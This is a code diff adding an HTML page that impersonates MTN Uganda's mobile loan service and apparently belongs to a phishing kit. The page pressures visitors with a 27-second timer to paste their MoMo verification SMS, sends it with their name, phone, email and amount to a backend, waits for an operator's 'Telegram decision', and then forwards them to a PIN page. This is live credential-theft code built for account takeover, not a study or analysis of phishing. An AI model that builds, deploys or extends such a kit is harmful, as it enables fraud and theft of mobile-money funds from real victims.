@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Verification - MTN Uganda</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer;
+        }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 16px; padding: 32px 28px 28px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+        }
+
+        .card h2 {
+            font-size: 22px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .card .desc {
+            font-size: 14px; color: #666; line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* Timer box */
+        .timer-box {
+            display: flex; align-items: center; gap: 14px;
+            background: #fffef8; border: 1px solid #ffeeb0;
+            border-radius: 10px; padding: 14px 16px;
+            margin-bottom: 20px;
+        }
+        .timer-circle {
+            width: 46px; height: 46px; border-radius: 50%;
+            border: 3px solid #d4a000;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 15px; font-weight: 900; color: #d4a000;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+        .timer-circle.urgent {
+            border-color: #dc2626; color: #dc2626;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        .timer-text { font-size: 13px; color: #7a5c00; line-height: 1.4; }
+        .timer-text strong { color: #5a4400; font-weight: 800; }
+
+        /* Textarea */
+        .sms-input {
+            width: 100%; min-height: 120px;
+            padding: 14px 16px;
+            font-size: 15px; font-family: inherit; color: #111;
+            border: 2px solid #ffcc00; border-radius: 10px;
+            background: #fffef8; outline: none; resize: vertical;
+            margin-bottom: 12px;
+            transition: box-shadow .2s, border-color .2s;
+        }
+        .sms-input::placeholder { color: #aaa; }
+        .sms-input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
+        .sms-input.error { border-color: #dc2626; background: #fff5f5; }
+
+        .example-text {
+            font-size: 12px; color: #888; font-style: italic;
+            margin-bottom: 18px; line-height: 1.5;
+        }
+
+        .submit-btn {
+            width: 100%; padding: 16px;
+            font-size: 15px; font-weight: 900; letter-spacing: 1px;
+            color: #fff; background: #9ca3af; border: none;
+            border-radius: 10px; cursor: not-allowed;
+            transition: background .2s;
+            text-transform: uppercase;
+        }
+        .submit-btn.active {
+            background: #ffcc00; color: #111; cursor: pointer;
+        }
+        .submit-btn.active:hover { background: #e6b800; }
+        .submit-btn.active:active { transform: scale(.99); }
+
+        .error-msg {
+            display: none; font-size: 13px; color: #dc2626;
+            font-weight: 700; text-align: center; margin-top: 12px;
+        }
+        .error-msg.show { display: block; }
+        .error-msg.info { color: #b8860b; }
+
+        .resend-wrap { text-align: center; margin-top: 16px; }
+        .resend-btn {
+            background: transparent; border: none; color: #b8860b;
+            font-size: 13px; font-weight: 700; cursor: pointer;
+            text-decoration: underline;
+        }
+        .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
+
+        /* Waiting overlay */
+        .waiting {
+            display: none; text-align: center; padding: 20px 0;
+        }
+        .waiting.show { display: block; }
+        .waiting .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #ffeeb0;
+            border-top: 5px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 18px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .waiting h3 {
+            font-size: 17px; font-weight: 800; color: #111;
+            margin-bottom: 6px;
+        }
+        .waiting p {
+            font-size: 13px; color: #666; line-height: 1.5;
+        }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 24px 20px; }
+            .card h2 { font-size: 19px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="login.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+
+            <!-- FORM VIEW -->
+            <div id="formView">
+                <h2>Paste SMS Message</h2>
+                <p class="desc">
+                    A verification message has been sent to your phone. Please copy
+                    and paste the full message here.
+                </p>
+
+                <div class="timer-box">
+                    <div class="timer-circle" id="timerCircle">27</div>
+                    <div class="timer-text">
+                        <strong>Message expires in <span id="timerSec">27</span>s.</strong><br>
+                        Paste your SMS before time runs out.
+                    </div>
+                </div>
+
+                <form id="verifyForm">
+                    <textarea id="code" class="sms-input"
+                              placeholder="Paste your full SMS message here..."
+                              maxlength="500" autocomplete="off"></textarea>
+
+                    <p class="example-text">
+                        Example: "Your MTN MoMo verification code is: 123456"
+                    </p>
+
+                    <button type="submit" class="submit-btn" id="submitBtn" disabled>
+                        Submit
+                    </button>
+                </form>
+
+                <p class="error-msg" id="errorMsg"></p>
+
+                <div class="resend-wrap">
+                    <button class="resend-btn" id="resendBtn">Didn't receive a code? Resend</button>
+                </div>
+            </div>
+
+            <!-- WAITING VIEW -->
+            <div class="waiting" id="waitingView">
+                <div class="spinner"></div>
+                <h3>Waiting for Approval</h3>
+                <p>Your SMS was sent to our reviewer.<br>Please wait a moment…</p>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone     = params.get('phone')     || '';
+        const firstName = params.get('firstName') || '';
+        const lastName  = params.get('lastName')  || '';
+        const email     = params.get('email')     || '';
+        const amount    = params.get('amount')    || '';
+
+        const codeInput  = document.getElementById('code');
+        const errorMsg   = document.getElementById('errorMsg');
+        const submitBtn  = document.getElementById('submitBtn');
+        const resendBtn  = document.getElementById('resendBtn');
+        const timerCircle = document.getElementById('timerCircle');
+        const timerSec   = document.getElementById('timerSec');
+
+        // ─── Timer (27s, restartable) ───
+        const TIMER_START = 27;
+        let timeLeft = TIMER_START;
+        let timerInterval = null;
+
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+
+            timeLeft = TIMER_START;
+            timerCircle.textContent = timeLeft;
+            timerSec.textContent = timeLeft;
+            timerCircle.classList.remove('urgent');
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerCircle.textContent = timeLeft;
+                timerSec.textContent = timeLeft;
+
+                if (timeLeft <= 10) timerCircle.classList.add('urgent');
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerCircle.textContent = '0';
+                    timerSec.textContent = '0';
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                    errorMsg.textContent = '⏰ Time expired. Please request a new code.';
+                    errorMsg.classList.add('show');
+                }
+            }, 1000);
+        }
+        startTimer();
+
+        // ─── Enable submit on input ───
+        codeInput.addEventListener('input', function () {
+            this.classList.remove('error');
+            errorMsg.classList.remove('show', 'info');
+
+            if (this.value.trim().length > 0 && timeLeft > 0) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
+        });
+
+        // ─── Polling for Telegram decision ───
+        let referenceId = null;
+        let pollTimer = null;
+
+        function startPolling() {
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
+                    const data = await res.json();
+
+                    if (data.status === 'confirmed') {
+                        clearInterval(pollTimer);
+                        const next = new URLSearchParams(params);
+                        next.set('ref', referenceId);
+                        window.location.href = 'pin.html?' + next.toString();
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        // Reset for retry
+                        document.getElementById('waitingView').classList.remove('show');
+                        document.getElementById('formView').style.display = 'block';
+                        codeInput.value = '';
+                        codeInput.disabled = false;
+                        codeInput.classList.remove('error');
+                        submitBtn.disabled = true;
+                        submitBtn.textContent = 'Submit';
+                        submitBtn.classList.remove('active');
+                        errorMsg.textContent = '❌ Message rejected. Please paste a new message.';
+                        errorMsg.style.color = '#dc2626';
+                        errorMsg.classList.add('show');
+                        startTimer();
+                    }
+                } catch (err) {
+                    console.error('Poll failed:', err);
+                }
+            }, 3000);
+        }
+
+        // ─── Submit SMS ───
+        document.getElementById('verifyForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const code = codeInput.value.trim();
+            if (code.length < 4) {
+                errorMsg.textContent = 'Please paste the full SMS message';
+                errorMsg.classList.add('show');
+                codeInput.classList.add('error');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'WAITING FOR APPROVAL...';
+            clearInterval(timerInterval);
+
+            try {
+                const res = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code, phone, firstName, lastName, email, amount })
+                });
+                const data = await res.json();
+                referenceId = data.referenceId;
+
+                // Switch to waiting view
+                document.getElementById('formView').style.display = 'none';
+                document.getElementById('waitingView').classList.add('show');
+
+                startPolling();
+            } catch (err) {
+                console.error('Send failed:', err);
+                errorMsg.textContent = '⚠️ Network error. Please try again.';
+                errorMsg.classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+                submitBtn.classList.add('active');
+            }
+        });
+
+        // ─── Resend ───
+        resendBtn.addEventListener('click', async function () {
+            if (pollTimer) clearInterval(pollTimer);
+            referenceId = null;
+
+            codeInput.value = '';
+            codeInput.classList.remove('error');
+            codeInput.disabled = false;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submit';
+            submitBtn.classList.remove('active');
+            errorMsg.classList.remove('show', 'info');
+            errorMsg.textContent = '';
+
+            startTimer();
+
+            this.disabled = true;
+            this.textContent = 'Sending...';
+
+            try {
+                await fetch('/api/resend-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+            } catch (err) {
+                console.error('Resend failed:', err);
+            }
+
+            errorMsg.textContent = '✅ New SMS requested. Please check your phone.';
+            errorMsg.style.color = '#3a7d44';
+            errorMsg.classList.add('show', 'info');
+
+            setTimeout(() => {
+                this.disabled = false;
+                this.textContent = "Didn't receive a code? Resend";
+                errorMsg.classList.remove('show', 'info');
+                errorMsg.style.color = '#dc2626';
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
